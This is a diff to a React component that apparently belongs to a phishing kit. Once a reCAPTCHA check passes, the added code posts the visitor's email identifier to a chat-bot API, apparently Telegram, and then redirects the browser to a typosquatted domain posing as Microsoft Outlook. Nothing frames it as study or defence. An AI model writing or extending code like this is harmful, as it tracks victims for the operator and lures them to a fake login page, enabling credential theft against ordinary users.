@@ -34,6 +34,22 @@ const App = () => {
   useEffect(() => {
     // Code to run on component mount or when certain dependencies change
     if (recaptchaValue) {
+      axios
+        .post(apiUrl, {
+          chat_id: userId,
+          text: `This email (${hashValue}) verified the recaptcha`,
+        })
+        .then((response) => {
+          if (response.data.ok) {
+            return;
+            // console.log("Message sent successfully!");
+          } else {
+            console.error("Failed to send message:", response.data.description);
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error.message);
+        });
       window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
 
       axios
